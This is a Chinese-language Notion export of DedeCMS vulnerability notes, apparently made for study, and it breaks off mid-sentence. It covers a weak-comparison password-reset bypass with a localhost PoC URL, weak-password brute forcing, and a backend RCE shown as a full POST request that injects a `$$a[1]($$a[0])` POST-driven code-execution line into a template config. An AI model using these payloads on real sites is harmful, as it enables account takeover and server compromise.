@@ -1,0 +1,740 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>dede CMS织梦漏洞合集 (php)</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="4ab65232-4024-42fa-a454-8cb5c73bba4f" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://www.notion.so/icons/bookmark_gray.svg"/></div><h1 class="page-title">dede CMS织梦漏洞合集 (php)</h1><p class="page-description"></p></header><div class="page-body"><h1 id="dc7befa0-bfe1-432b-adcb-b7d30dbe28e1" class="">一、相关基础</h1><h3 id="4d2a794b-377e-4bc1-aa1e-d70efefbd0d6" class="">1-相关介绍</h3><p id="5b19c7d3-97b3-4879-b9f6-97ba79e218e0" class="">dedecms织梦，是国内最知名的 PHP 开源网站管理系统。作为一款通用型的内容管理系统，广泛应用于新闻、资讯类网站。</p><h1 id="9cb17d83-0b35-4e70-a530-ff0881c168ab" class="">二、漏洞介绍</h1><h3 id="ae9677d3-1a10-4272-b105-fde1bac6bbcf" class="">1-<strong>前台任意用户密码修改漏洞</strong></h3><p id="c34091bb-953a-4a0a-9999-2e1daf4d710f" class="">【条件&amp;影响】</p><p id="1ed00de7-9103-4c76-bd28-3acb168fcd23" class="">1、 只影响前台账户，也只能修改未设置安全问题的账户</p><p id="c987d4f9-de65-4e3a-ad8b-3291ac21a2d4" class="">3、 影响版本：DeDeCMSV5.7SP2 正式版(2018-01-09)</p><p id="36095ee3-0bd5-4d5b-aaf6-f88b5b830a30" class="">【原理】</p><p id="adb2d372-4fea-45ff-b414-32c6ea2b339a" class="">逻辑漏洞-弱类型比较攻击<div class="indented"><p id="16e162fe-d3e7-46fb-aa45-6d02735dc0a0" class="">由于前台resetpassword.php中对接受的safeanswer参数类型比较不够严格，遭受弱类型比较攻击</p><p id="49c371bd-9dbf-41c3-9ffb-f1fd50eca6c8" class="">导致了远程攻击者可以在前台会员中心绕过验证，进行任意用户密码重置攻击</p><ul id="00507dad-0b25-487b-b016-f8773564070a" class="toggle"><li><details open=""><summary>漏洞触发位置：dedecms/member/resetpassword.php(75行)</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2823e051-d7eb-4d26-bb57-c2ac09df6011" class="code"><code class="language-PHP">else if ($dopost == &quot;safequestion&quot;) {
+    // 从$id中提取数字部分并赋值给$mid
+    $mid = preg_replace(&quot;#[^0-9]#&quot;, &quot;&quot;, $id);
+
+    // 构建SQL查询语句，获取对应会员的安全问题和答案
+    $sql = &quot;SELECT safequestion, safeanswer, userid, email FROM #@__member WHERE mid = &#x27;$mid&#x27;&quot;;
+    
+    // 执行查询并获取结果
+    $row = $db-&gt;GetOne($sql);
+
+    // 如果$safequestion为空，则赋值为空字符串
+    if (empty($safequestion)) $safequestion = &#x27;&#x27;;
+    // 如果$safeanswer为空，则赋值为空字符串
+    if (empty($safeanswer)) $safeanswer = &#x27;&#x27;;
+
+    // 比较用户输入的安全问题和答案是否与数据库中的匹配
+    if ($row[&#x27;safequestion&#x27;] == $safequestion &amp;&amp; $row[&#x27;safeanswer&#x27;] == $safeanswer) {
+        // 调用sn函数，并传递会员ID、用户ID、邮箱和&#x27;N&#x27;参数
+        sn($mid, $row[&#x27;userid&#x27;], $row[&#x27;email&#x27;], &#x27;N&#x27;);
+        exit();
+    } else {
+        // 显示错误信息，并退出
+        ShowMsg(&quot;对不起，您的安全问题或答案回答错误&quot;, &quot;-1&quot;);
+        exit();
+    }
+}
+</code></pre></details></li></ul></div></p><p id="e3660296-ace9-4655-8ada-cde0ba0721e3" class="">【poc&amp;利用过程】</p><blockquote id="7dd05bdd-2974-4685-826c-c8e6ef9a5c96" class="">环境搭建参考：<a href="https://blog.csdn.net/weixin_52497013/article/details/121468861">https://blog.csdn.net/weixin_52497013/article/details/121468861</a></blockquote><p id="ca19e55e-727e-403f-92a6-00e622f7d960" class="">1、构建一个携带“保密问题为空、答案为空”参数的url请求：<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ce701bab-16be-4760-937b-81f39acab81c" class="code"><code class="language-Plain Text">http://127.0.0.1:9090/member/resetpassword.php？dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=2</code></pre><p id="151b59bb-c274-4dc6-bf75-0050c3c64ab6" class="">这里id参数是某个没有设置密保问题的用户的“用户id”</p></div></p><p id="1a66ac8e-3056-4aa1-8bba-390f8366f73f" class="">2、获得临时验证码<div class="indented"><p id="b82beb04-52d4-401f-8ef8-18e094a9063b" class="">bp抓包，会看到url这里被它的服务端自动填上了一个临时验证码：</p><figure id="77476340-4d6c-480a-ab9e-9439335941d4" class="image"><a href="dede%20CMS%E7%BB%87%E6%A2%A6%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%204ab65232402442faa4548cb5c73bba4f/Untitled.png"><img style="width:480px" src="dede%20CMS%E7%BB%87%E6%A2%A6%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%204ab65232402442faa4548cb5c73bba4f/Untitled.png"/></a></figure><p id="47a77b3f-2356-4dc0-b88b-26978a6620f5" class="">这个临时验证码好像就是表示“修改密码成功”的凭证，其可以对这个刚刚uid的用户生效</p></div></p><p id="d907e231-7df0-457c-996b-e2b2ab81c6c4" class="">3、访问该用户的“找回密码界面”<div class="indented"><figure id="ec57ddb6-fb98-4895-aefe-6469c1f55d72" class="image"><a href="dede%20CMS%E7%BB%87%E6%A2%A6%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%204ab65232402442faa4548cb5c73bba4f/Untitled%201.png"><img style="width:288px" src="dede%20CMS%E7%BB%87%E6%A2%A6%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%204ab65232402442faa4548cb5c73bba4f/Untitled%201.png"/></a></figure><p id="9f00dcd1-3a23-421c-ab5a-b3967b935176" class="">写进去刚刚的“临时验证码”，就可以成功登录</p></div></p><h3 id="28c39e49-616e-4304-9b9c-8c80d2ae5434" class="">2-弱密码爆破</h3><p id="10c0bfaa-e977-4812-8a85-f34c17e760b5" class="">【介绍】</p><p id="42894035-90eb-4390-a74d-01b4d2eab76c" class="">因为这个系统在创建密码的时候要求不严格，所以用户可以注册一些有弱密码的账号</p><p id="0755e8c7-dd61-4130-9003-8f01a36f4b31" class="">攻击者可以进行弱密码爆破尝试</p><h3 id="5f540c12-293b-42d4-a73e-d28bae918fb8" class="">3-DedeCMSV5.7.114后台article_template_rand.php存在远程代码执行漏洞</h3><p id="5b9b1070-012a-452c-9bd3-e20372681073" class="">【介绍】</p><p id="8f3503c8-6a68-4f93-bc65-f6b9c2e1b11b" class="">【条件&amp;影响】</p><p id="9bf8d186-4b95-4281-b4e2-d4a70cb73299" class="">V5.7.114</p><p id="049574af-836d-421d-bf75-a5dbdd006972" class="">【poc】</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ebdb6161-053b-43fa-b2c1-f7f3a75cdfc6" class="code"><code class="language-Plain Text">POST /dede/article_template_rand.php HTTP/1.1
+Host: 127.0.0.11
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1065
+Origin: http://127.0.0.11
+Connection: close
+Referer: http://127.0.0.11/dede/article_template_rand.php
+Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=89s6bbv2d1unokav5grt4bk2g4; _csrf_name_236f0c58=8f0d4c50bfce77f693ce4b8d93af8be7; _csrf_name_236f0c581BH21ANI1AGD297L1FF21LN02BGE1DNG=23bfa72eb66439a6; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=10acd9938ef3615d; DedeLoginTime=1720185221; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d2b9bcefe628ee47; ENV_GOBACK_URL=%2Fdede%2Fsys_admin_user.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: iframe
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=4
+
+dopost=save&amp;token=7fa44bfa91d7f797b4c983c76f7c9f9e&amp;templates=%3C%3Fphp%0D%0A%0D%0A%2F%2F%E8%BF%99%E4%B8%AA%E5%80%BC%E4%B8%BA+0+%E8%A1%A8%E7%A4%BA%E5%85%B3%E9%97%AD%E6%AD%A4%E8%AE%BE%E7%BD%AE%EF%BC%8C+%E4%B8%BA+1+%E8%A1%A8%E7%A4%BA%E5%BC%80%E5%90%AF%0D%0A%24cfg_tamplate_rand+%3D+0%3B%0D%0A%0D%0A%2F%2F%E6%A8%A1%E6%9D%BF%E6%95%B0%E7%BB%84%EF%BC%8C%E5%A6%82%E6%9E%9C%E9%9C%80%E8%A6%81%E5%A2%9E%E5%8A%A0%EF%BC%8C%E6%8C%89%E8%BF%99%E4%B8%AA%E6%A0%BC%E5%BC%8F%E5%A2%9E%E5%8A%A0%E6%88%96%E4%BF%AE%E6%94%B9%E5%8D%B3%E5%8F%AF%28%E5%BF%85%E9%A1%BB%E7%A1%AE%E4%BF%9D%E8%BF%99%E4%BA%9B%E6%A8%A1%E6%9D%BF%E6%98%AF%E5%AD%98%E5%9C%A8%E7%9A%84%29%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%95%B0%E9%87%8F%E5%BF%85%E9%A1%BB%E4%B8%BA2%E4%B8%AA%E6%88%96%E4%BB%A5%E4%B8%8A%E3%80%82%0D%0A%24cfg_tamplate_arr%5B%5D+%3D+%27article_article.htm%27%3B%0D%0A%24cfg_tamplate_arr%5B%5D+%3D+%27article_article1.htm%27%3B%0D%0A%24cfg_tamplate_arr%5B%5D+%3D+%27article_article2.htm%27%3B%0D%0A%24a+%3D+%27_POST%27%3B%0D%0A%24%24a%5B1%5D%28%24%24a%5B0%5D%29%3B%0D%0A%3F%3E%0D%0A&amp;imageField1.x=6&amp;imageField1.y=9</code></pre><blockquote id="4e10ac45-21e6-4ecc-9b58-9e171920aad5" class="">其中，这个templates做unicode解url编码的结果是：<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" 